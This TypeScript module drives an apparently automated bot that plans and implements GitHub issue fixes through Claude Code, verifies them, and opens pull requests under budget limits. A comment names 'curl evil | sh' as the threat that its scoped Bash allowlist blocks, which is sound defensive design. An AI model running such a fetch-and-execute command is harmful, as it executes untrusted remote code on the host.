import simpleGit from "simple-git";
import { db } from "../db";
import { botConfig } from "../../bot.config";
import { runClaudeCode, runStructuredPlan } from "../claude/runner";
import {
  PLAN_JSON_SCHEMA,
  implementPrompt,
  iterationPrompt,
  planPrompt,
  PROMPT_VERSION,
  type IssueForPrompt,
} from "../claude/prompts";
import { z } from "zod";
import { getRepoSummary } from "./repo-summary";
import { assertNotProtected, createWorktree, removeWorktree } from "./worktree";
import { runVerification } from "../verification";
import type { Plan, Verdict } from "../verification/types";
import { renderPrBody } from "./pr-body";
import {
  addLabel,
  commentOnIssue,
  openPullRequest,
  removeLabel,
} from "../github/client";
import { emitEvent } from "../shared/events";
import { log } from "../shared/logger";
import { dayBudgetOk, issueBudgetOk } from "./budget";

const PlanSchema = z.object({
  files_to_change: z.array(
    z.object({
      path: z.string(),
      kind: z.enum(["modify", "create", "delete"]),
      why: z.string(),
    }),
  ),
  tests_to_add_or_update: z.array(
    z.object({ path: z.string(), describes: z.string() }),
  ),
  user_visible_change: z.string(),
  edge_cases: z.array(z.string()),
  complexity: z.enum(["trivial", "small", "medium", "large"]),
  should_abort: z.boolean(),
  abort_reason: z.string().nullable(),
}) satisfies z.ZodType<Plan>;

export type ImplementerInput = {
  repoDir: string;
  owner: string;
  repo: string;
  baseBranch: string;
  issue: IssueForPrompt;
};

/**
 * Tools the implementer is allowed to use inside Claude Code.
 *
 * Two non-obvious choices:
 *  - `Bash(...)` is SCOPED to known-safe commands. Unconstrained `Bash` would
 *    let the model do `curl evil | sh`. We allow node/python/rust/go test
 *    runners plus read-only git inspection, nothing else.
 *  - **No `git commit / push / checkout / stash` for the model.** Git state
 *    transitions are the bot's job, not Claude's. The bot drives commit/push
 *    after verification, and stash/checkout for the mutation-light check.
 */
const IMPLEMENTER_ALLOWED_TOOLS = [
  // node/npm
  "Bash(npm *)", "Bash(npx *)", "Bash(node *)", "Bash(pnpm *)",
  // testers
  "Bash(jest *)", "Bash(vitest *)", "Bash(pytest *)", "Bash(go test *)",
  // build/typecheck/lint
  "Bash(cargo *)", "Bash(tsc *)", "Bash(eslint *)", "Bash(prettier *)",
  // read-only git
  "Bash(git status *)", "Bash(git diff *)", "Bash(git log *)",
  // filesystem inspection
  "Bash(ls *)", "Bash(cat *)", "Bash(grep *)", "Bash(find *)",
  // safe create
  "Bash(mkdir *)", "Bash(rm -f *)",
  // Claude-native
  "Read", "Edit", "Write", "Glob", "Grep",
];

function createRunRow(input: ImplementerInput): number {
  const info = db
    .prepare(
      `INSERT INTO runs (type, repo, issue_number, issue_title, issue_body, status, started_at)
       VALUES ('implement', ?, ?, ?, ?, 'queued', ?)`,
    )
    .run(
      `${input.owner}/${input.repo}`,
      input.issue.number,
      input.issue.title,
      input.issue.body,
      Date.now(),
    );
  return Number(info.lastInsertRowid);
}

function updateRun(runId: number, patch: Record<string, unknown>) {
  const keys = Object.keys(patch);
  if (!keys.length) return;
  const sets = keys.map((k) => `${k} = ?`).join(", ");
  const values = keys.map((k) => (patch as Record<string, unknown>)[k]);
  db.prepare(`UPDATE runs SET ${sets} WHERE id = ?`).run(...values, runId);
}

function incCost(runId: number, deltaUsd: number) {
  db.prepare(`UPDATE runs SET cost_usd = cost_usd + ? WHERE id = ?`).run(
    deltaUsd,
    runId,
  );
}

function saveArtifact(runId: number, kind: string, content: string) {
  db.prepare(
    `INSERT INTO artifacts (run_id, kind, content, created_at) VALUES (?, ?, ?, ?)`,
  ).run(runId, kind, content, Date.now());
}

/**
 * Slimmed-down verdict text for the iteration prompt. We only feed back the
 * FAILING checks with a short tail of stdout — the full verdict (all 8 checks,
 * full stdout dumps) can balloon to 30 KB and dilutes the failure signal.
 */
function verdictForRetry(v: Verdict): string {
  const failing = Object.values(v.checks).filter((c) => !c.pass);
  return failing
    .map((c) => {
      const detail = c.detail as { stdoutTail?: string } | undefined;
      const tail = detail?.stdoutTail?.slice(-200) ?? "";
      const indented = tail.replace(/\n/g, "\n    ");
      return `- ${c.name} (${c.hardGate ? "HARD" : "soft"}): ${c.message}${tail ? `\n    ${indented}` : ""}`;
    })
    .join("\n");
}

/**
 * Drop the bot-claimed and bot-please labels off the issue. Idempotent —
 * fine to call multiple times. Best-effort: a failure here shouldn't fail
 * the run.
 */
async function cleanupLabels(args: {
  owner: string;
  repo: string;
  issue_number: number;
  alsoRemovePlease: boolean;
}) {
  await Promise.allSettled([
    removeLabel({
      owner: args.owner,
      repo: args.repo,
      issue_number: args.issue_number,
      label: botConfig.labels.claimed,
    }),
    args.alsoRemovePlease
      ? removeLabel({
          owner: args.owner,
          repo: args.repo,
          issue_number: args.issue_number,
          label: botConfig.labels.request,
        })
      : Promise.resolve(),
  ]);
}

export async function runImplementer(input: ImplementerInput): Promise<{
  runId: number;
  outcome: "succeeded" | "needs-review" | "abandoned" | "failed";
  prNumber?: number;
  prUrl?: string;
}> {
  const day = dayBudgetOk();
  if (!day.ok) {
    log.warn(
      "implementer",
      `daily budget exceeded ($${day.spentUsd.toFixed(2)}) — skipping issue #${input.issue.number}`,
    );
    throw new Error(`Daily budget exceeded ($${day.spentUsd.toFixed(2)})`);
  }
  const issueBudget = issueBudgetOk(
    `${input.owner}/${input.repo}`,
    input.issue.number,
  );
  if (!issueBudget.ok) {
    log.warn(
      "implementer",
      `per-issue budget exceeded for #${input.issue.number} ($${issueBudget.spentUsd.toFixed(2)})`,
    );
    throw new Error(
      `Per-issue budget exceeded for #${input.issue.number}`,
    );
  }

  const runId = createRunRow(input);
  emitEvent(runId, "run.created", { type: "implement", issue: input.issue.number });

  // A1: apply the bot-claimed label IMMEDIATELY as the cross-process lock.
  // Anything that opens the run row but fails before label-application is
  // fine — the recoverCrashedRuns sweep on next coordinator boot will fix it.
  await addLabel({
    owner: input.owner,
    repo: input.repo,
    issue_number: input.issue.number,
    label: botConfig.labels.claimed,
  }).catch((err) =>
    log.warn("implementer", `could not apply bot-claimed: ${err}`),
  );

  updateRun(runId, { status: "planning" });
  emitEvent(runId, "run.status", { status: "planning" });

  let worktreePath: string | null = null;
  let branch: string | null = null;

  try {
    // 1. Worktree — wrapped in try so creation failures route through the
    //    standard finalize-and-clean-labels path.
    const wt = await createWorktree({
      repoDir: input.repoDir,
      issueNumber: input.issue.number,
      baseBranch: input.baseBranch,
    });
    branch = wt.branch;
    worktreePath = wt.worktreePath;
    assertNotProtected(branch);
    updateRun(runId, { branch_name: branch, worktree_path: worktreePath });

    // 2. Plan
    emitEvent(runId, "plan.started", {});
    const repoSummary = await getRepoSummary(worktreePath);
    const planRes = await runStructuredPlan({
      runId,
      prompt: planPrompt(input.issue, repoSummary),
      cwd: worktreePath,
      schema: PlanSchema,
      jsonSchema: PLAN_JSON_SCHEMA,
      costBudgetUsd: botConfig.budgets.perRunUsd,
    });
    if (!planRes.ok) {
      // A8: capture the partial cost even on planner failure.
      if (planRes.partialCostUsd) incCost(runId, planRes.partialCostUsd);
      emitEvent(runId, "plan.aborted", { reason: planRes.error });
      updateRun(runId, {
        status: "failed",
        finished_at: Date.now(),
        error_message: planRes.error,
      });
      await cleanupLabels({
        owner: input.owner,
        repo: input.repo,
        issue_number: input.issue.number,
        alsoRemovePlease: false,
      });
      if (worktreePath)
        await removeWorktree({
          repoDir: input.repoDir,
          worktreePath,
          force: true,
        });
      return { runId, outcome: "failed" };
    }
    incCost(runId, planRes.costUsd);
    saveArtifact(runId, "plan", JSON.stringify(planRes.plan, null, 2));
    emitEvent(runId, "plan.completed", {
      complexity: planRes.plan.complexity,
      filesPlanned: planRes.plan.files_to_change.length,
      testsPlanned: planRes.plan.tests_to_add_or_update.length,
    });

    if (planRes.plan.should_abort) {
      const reason = planRes.plan.abort_reason ?? "no reason given";
      await commentOnIssue({
        owner: input.owner,
        repo: input.repo,
        issue_number: input.issue.number,
        body: `🤖 The bot examined this issue and chose not to attempt an implementation.\n\n**Reason:** ${reason}`,
      }).catch(() => {});
      // The bot bows out gracefully — leave bot-please on so a human can
      // re-decide; just remove the claim.
      await cleanupLabels({
        owner: input.owner,
        repo: input.repo,
        issue_number: input.issue.number,
        alsoRemovePlease: false,
      });
      updateRun(runId, {
        status: "abandoned",
        finished_at: Date.now(),
        error_message: `plan abort: ${reason}`,
      });
      emitEvent(runId, "run.finished", { outcome: "abandoned" });
      await removeWorktree({
        repoDir: input.repoDir,
        worktreePath,
        force: true,
      });
      return { runId, outcome: "abandoned" };
    }

    // 3. Implementation + iteration loop
    updateRun(runId, { status: "implementing" });
    emitEvent(runId, "run.status", { status: "implementing" });
    let lastSessionId: string | undefined;
    let lastVerdict: Verdict | null = null;
    let attempt = 0;

    while (attempt < botConfig.verification.maxIterations) {
      attempt += 1;
      updateRun(runId, { attempts: attempt });

      const prompt =
        attempt === 1
          ? implementPrompt(input.issue, planRes.plan)
          : // B2: slim retry payload — only failing checks + 200-char tails.
            iterationPrompt(
              verdictForRetry(lastVerdict!),
              JSON.stringify(planRes.plan, null, 2),
            );

      if (attempt > 1) {
        emitEvent(runId, "iteration.started", { attempt });
        updateRun(runId, { status: "iterating" });
      } else {
        emitEvent(runId, "implement.started", {});
      }

      const impl = await runClaudeCode({
        runId,
        mode: "implement",
        prompt,
        cwd: worktreePath,
        // A5: scoped Bash + no git mutation tools for the model.
        allowedTools: IMPLEMENTER_ALLOWED_TOOLS,
        permissionMode: "acceptEdits",
        resumeSessionId: lastSessionId,
        costBudgetUsd: botConfig.budgets.perRunUsd,
      });
      if (impl.ok) lastSessionId = impl.sessionId;
      incCost(runId, impl.ok ? impl.costUsd : (impl.partialCostUsd ?? 0));

      if (!impl.ok) {
        emitEvent(runId, "implement.failed", {
          kind: impl.errorKind,
          message: impl.errorMessage,
        });
        // Wrapper failures (timeout / hang / budget) are non-retryable. Fail.
        updateRun(runId, {
          status: "failed",
          finished_at: Date.now(),
          error_message: `${impl.errorKind}: ${impl.errorMessage}`,
        });
        await cleanupLabels({
          owner: input.owner,
          repo: input.repo,
          issue_number: input.issue.number,
          alsoRemovePlease: false,
        });
        await removeWorktree({
          repoDir: input.repoDir,
          worktreePath,
          force: true,
        });
        return { runId, outcome: "failed" };
      }
      emitEvent(runId, "implement.completed", {});

      // 4. Verify
      updateRun(runId, { status: "verifying" });
      lastVerdict = await runVerification({
        runId,
        attempt,
        cwd: worktreePath,
        baseRef: `origin/${input.baseBranch}`,
        plan: planRes.plan,
        issue: input.issue,
      });

      // A6: if mutation-light blew up the worktree, bail immediately — no
      // sense iterating in a corrupted tree.
      const mutationDetail = lastVerdict.checks.mutation_light.detail as
        | { popStderr?: string; broken?: boolean }
        | undefined;
      if (mutationDetail?.popStderr || mutationDetail?.broken) {
        emitEvent(runId, "run.worktree_broken", {
          detail: mutationDetail,
        });
        updateRun(runId, {
          status: "failed",
          finished_at: Date.now(),
          error_message: "worktree state corrupted during mutation check",
        });
        await cleanupLabels({
          owner: input.owner,
          repo: input.repo,
          issue_number: input.issue.number,
          alsoRemovePlease: false,
        });
        await removeWorktree({
          repoDir: input.repoDir,
          worktreePath,
          force: true,
        });
        return { runId, outcome: "failed" };
      }

      if (lastVerdict.pass) break;
    }

    const needsReview = !lastVerdict?.pass;

    // 5. Open PR
    const git = simpleGit(worktreePath);
    await git.add(["-A"]);
    const status = await git.status();
    if (!status.files.length) {
      updateRun(runId, {
        status: "failed",
        finished_at: Date.now(),
        error_message: "no diff produced",
      });
      await cleanupLabels({
        owner: input.owner,
        repo: input.repo,
        issue_number: input.issue.number,
        alsoRemovePlease: false,
      });
      await removeWorktree({
        repoDir: input.repoDir,
        worktreePath,
        force: true,
      });
      return { runId, outcome: "failed" };
    }
    const summary = planRes.plan.user_visible_change;
    await git.commit(
      `bot: ${input.issue.title}\n\nCloses #${input.issue.number}\n\n${summary}\n\nPrompt-version: ${PROMPT_VERSION}`,
    );
    await git.push("origin", branch!, ["--set-upstream"]);

    const costRow = db
      .prepare(`SELECT cost_usd FROM runs WHERE id = ?`)
      .get(runId) as { cost_usd: number };
    const prBody = renderPrBody({
      issue: input.issue,
      plan: planRes.plan,
      verdict: lastVerdict!,
      attempts: attempt,
      runId,
      costUsd: costRow.cost_usd,
      needsReview,
    });

    const pr = await openPullRequest({
      owner: input.owner,
      repo: input.repo,
      head: branch!,
      base: input.baseBranch,
      title: `bot: ${input.issue.title}`,
      body: prBody,
      labels: needsReview ? [botConfig.labels.needsReview] : [],
    });

    updateRun(runId, {
      pr_number: pr.number,
      pr_url: pr.url,
      status: needsReview ? "needs-review" : "pr-opened",
      finished_at: Date.now(),
    });
    emitEvent(runId, needsReview ? "pr.needs_review" : "pr.opened", {
      number: pr.number,
      url: pr.url,
    });
    emitEvent(runId, "run.finished", {
      outcome: needsReview ? "needs-review" : "pr-opened",
    });

    // A2: PR is now the source of truth. Drop both bot-please AND bot-claimed
    // so a stale-runs sweep can't pick this issue up again later.
    await cleanupLabels({
      owner: input.owner,
      repo: input.repo,
      issue_number: input.issue.number,
      alsoRemovePlease: true,
    });

    if (needsReview) {
      await commentOnIssue({
        owner: input.owner,
        repo: input.repo,
        issue_number: input.issue.number,
        body: `🤖 I attempted this issue but couldn't fully satisfy the verification harness after ${attempt} attempts. Opened PR #${pr.number} for human review — see the verification report in the PR body.`,
      }).catch(() => {});
    }

    return {
      runId,
      outcome: needsReview ? "needs-review" : "succeeded",
      prNumber: pr.number,
      prUrl: pr.url,
    };
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    log.error("implementer", `unhandled error in run ${runId}: ${message}`);
    updateRun(runId, {
      status: "failed",
      finished_at: Date.now(),
      error_message: message,
    });
    // B9: also covers the case where createWorktree itself threw before
    // setting worktreePath. cleanupLabels is best-effort.
    await cleanupLabels({
      owner: input.owner,
      repo: input.repo,
      issue_number: input.issue.number,
      alsoRemovePlease: false,
    });
    if (worktreePath) {
      await removeWorktree({
        repoDir: input.repoDir,
        worktreePath,
        force: true,
      }).catch(() => {});
    }
    return { runId, outcome: "failed" };
  }
}
